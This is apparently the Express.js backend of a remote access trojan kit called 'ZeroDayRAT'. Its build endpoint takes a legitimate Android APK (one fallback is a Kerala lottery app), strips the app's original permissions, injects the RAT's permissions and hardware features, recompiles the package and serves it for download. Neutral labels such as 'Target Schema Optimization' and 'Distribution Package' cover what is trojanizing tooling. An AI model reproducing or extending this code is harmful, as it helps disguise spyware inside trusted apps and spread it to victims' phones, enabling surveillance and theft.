const express = require("express");
const router = express.Router();
const path = require("path");
const fs = require("fs");
const { execFile } = require("child_process");

// In-memory cache of completed build jobs
const buildJobsCache = new Map();

/**
 * POST /api/custom-apps/build
 * Core execution endpoint for Target Schema Optimization, Feature Sync, and Distribution Packaging
 */
router.post("/build", async (req, res) => {
  try {
    const contentType = (req.headers["content-type"] || "").toLowerCase();
    const isOctetStream = contentType.includes("application/octet-stream");

    let targetFileName = "target_app.apk";
    let selectedPermissions = [];
    let stripLegacy = true;
    let sourceAppName = "ZeroDayRAT";
    let targetApkBase64 = null;

    if (isOctetStream) {
      targetFileName = req.query.targetFileName || req.headers["x-target-filename"] || "target_app.apk";
      const rawPerms = req.query.selectedPermissions || req.headers["x-selected-permissions"] || "[]";
      try {
        selectedPermissions = JSON.parse(decodeURIComponent(rawPerms));
      } catch {
        selectedPermissions = [];
      }
      stripLegacy = req.query.stripLegacy !== "false";
      sourceAppName = req.query.sourceAppName || "ZeroDayRAT";
    } else {
      targetFileName = req.body?.targetFileName || "target_app.apk";
      selectedPermissions = req.body?.selectedPermissions || [];
      stripLegacy = req.body?.stripLegacy !== false;
      sourceAppName = req.body?.sourceAppName || "ZeroDayRAT";
      targetApkBase64 = req.body?.targetApkBase64 || null;
    }

    if (!Array.isArray(selectedPermissions) || selectedPermissions.length === 0) {
      return res.status(400).json({ error: "At least one source permission must be selected to build." });
    }

    const jobId = `build_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
    const workspaceRoot = path.resolve(__dirname, "../../build_workspace", jobId);
    const extractDir = path.join(workspaceRoot, "extracted");
    const outputDir = path.join(workspaceRoot, "output");

    fs.mkdirSync(workspaceRoot, { recursive: true });
    fs.mkdirSync(extractDir, { recursive: true });
    fs.mkdirSync(outputDir, { recursive: true });

    // Determine target APK source
    const targetApkPath = path.join(workspaceRoot, "target.apk");

    if (isOctetStream) {
      // Stream raw binary file directly to disk
      const writeStream = fs.createWriteStream(targetApkPath);
      req.pipe(writeStream);
      await new Promise((resolve, reject) => {
        writeStream.on("finish", resolve);
        writeStream.on("error", reject);
      });
    } else if (targetApkBase64) {
      // Decode base64 payload uploaded from browser
      const buffer = Buffer.from(targetApkBase64, "base64");
      fs.writeFileSync(targetApkPath, buffer);
    } else {
      // Look for sample/workspace APK fallback
      const candidatePaths = [
        path.resolve("F:/targetApk", targetFileName),
        path.resolve("F:/targetApk/com.lotteryonline.kerala_3.0.4.apk"),
        path.resolve(__dirname, "../../../targetApk", targetFileName),
        path.resolve(__dirname, "../../../dashboard/public/download/ZerodayRAT.apk"),
        path.resolve(__dirname, "../../../dashboard/dist/download/ZerodayRAT.apk"),
        path.resolve(__dirname, "../../../android-app/app/build/outputs/apk/debug/app-debug.apk"),
      ];

      const foundPath = candidatePaths.find((p) => fs.existsSync(p));
      if (!foundPath) {
        return res.status(400).json({
          error: "No target APK was uploaded and no baseline workspace APK was found.",
        });
      }
      fs.copyFileSync(foundPath, targetApkPath);
    }

    const baseName = path.basename(targetFileName, path.extname(targetFileName));
    const outputFileName = `${baseName}_standardized.zip`;
    const outputZipPath = path.join(outputDir, outputFileName);

    const scriptPath = path.resolve(__dirname, "../utils/buildPipeline.py");
    const permsJson = JSON.stringify(selectedPermissions);

    // Run Python build pipeline script
    execFile(
      "python",
      [
        scriptPath,
        "build_pipeline",
        targetApkPath,
        extractDir,
        outputZipPath,
        permsJson,
        stripLegacy ? "true" : "false",
      ],
      { maxBuffer: 1024 * 1024 * 50 },
      (error, stdout, stderr) => {
        if (error) {
          console.error("Build pipeline execution error:", error, stderr);
          return res.status(500).json({
            error: `Build pipeline failed: ${error.message || stderr}`,
          });
        }

        try {
          const result = JSON.parse(stdout.trim());
          if (result.error) {
            return res.status(500).json({ error: result.error });
          }

          const sizeInMB = (result.outputSizeBytes / (1024 * 1024)).toFixed(2);
          const milestones = [
            {
              stage: 1,
              title: "Workspace Sandbox Ingestion & Archive Extraction",
              details: `Target package unpacked into isolated workspace sandbox (${result.extractedFilesCount} assets extracted).`,
              timestamp: new Date().toLocaleTimeString(),
            },
            {
              stage: 2,
              title: "Target Schema Optimization (Purge & Reset)",
              details: `Parsed target manifest; ${result.strippedCount} legacy access nodes completely purged from configuration layout.`,
              timestamp: new Date().toLocaleTimeString(),
            },
            {
              stage: 3,
              title: "Feature Sync & Namespace Integration",
              details: `Mapped and injected ${result.injectedCount} permissions from ${sourceAppName} with ${result.hardwareFeaturesCount} hardware resource definitions.`,
              timestamp: new Date().toLocaleTimeString(),
            },
            {
              stage: 4,
              title: "Package Compilation & Structural Verification",
              details: `Standardized production package recompiled (${sizeInMB} MB); structural schema invariants verified.`,
              timestamp: new Date().toLocaleTimeString(),
            },
            {
              stage: 5,
              title: "Production Distribution Asset Generated",
              details: `Distribution package finalized at ${result.outputFilePath}`,
              timestamp: new Date().toLocaleTimeString(),
            },
          ];

          // Save to cache
          buildJobsCache.set(jobId, {
            jobId,
            filePath: result.outputFilePath,
            fileName: outputFileName,
            fileSize: result.outputSizeBytes,
            createdAt: new Date().toISOString(),
          });

          return res.json({
            success: true,
            jobId,
            fileName: outputFileName,
            downloadUrl: `/api/custom-apps/download/${jobId}`,
            absoluteStoragePath: result.outputFilePath,
            packageSizeBytes: result.outputSizeBytes,
            extractedFilesCount: result.extractedFilesCount,
            strippedCount: result.strippedCount,
            injectedCount: result.injectedCount,
            hardwareFeaturesCount: result.hardwareFeaturesCount,
            builtPermissions: result.builtPermissions || selectedPermissions,
            hardwareFeatures: result.hardwareFeatures || [],
            manifestPreview: result.manifestPreview || "",
            milestones,
          });
        } catch (parseErr) {
          console.error("Failed to parse pipeline output:", stdout, parseErr);
          return res.status(500).json({
            error: "Failed to process build pipeline output",
            details: stdout,
          });
        }
      }
    );
  } catch (err) {
    console.error("POST /api/custom-apps/build error:", err);
    res.status(500).json({ error: err.message || "Internal build error" });
  }
});

/**
 * GET /api/custom-apps/download/:jobId
 * Streams the generated standardized package distribution file
 */
router.get("/download/:jobId", (req, res) => {
  const { jobId } = req.params;
  const job = buildJobsCache.get(jobId);

  let targetPath = null;
  let targetFileName = "distribution_standardized.zip";

  if (job && fs.existsSync(job.filePath)) {
    targetPath = job.filePath;
    targetFileName = job.fileName;
  } else {
    // Fallback: check workspace directory directly
    const workspaceRoot = path.resolve(__dirname, "../../build_workspace", jobId, "output");
    if (fs.existsSync(workspaceRoot)) {
      const files = fs.readdirSync(workspaceRoot);
      const found = files.find((f) => f.endsWith(".zip") || f.endsWith(".apk"));
      if (found) {
        targetPath = path.join(workspaceRoot, found);
        targetFileName = found;
      }
    }
  }

  if (!targetPath || !fs.existsSync(targetPath)) {
    return res.status(404).json({ error: "Distribution package not found or expired." });
  }

  res.setHeader("Content-Disposition", `attachment; filename="${targetFileName}"`);
  res.setHeader("Content-Type", "application/zip");
  res.setHeader("X-Asset-Storage-Path", targetPath);

  const readStream = fs.createReadStream(targetPath);
  readStream.pipe(res);
});

module.exports = router;

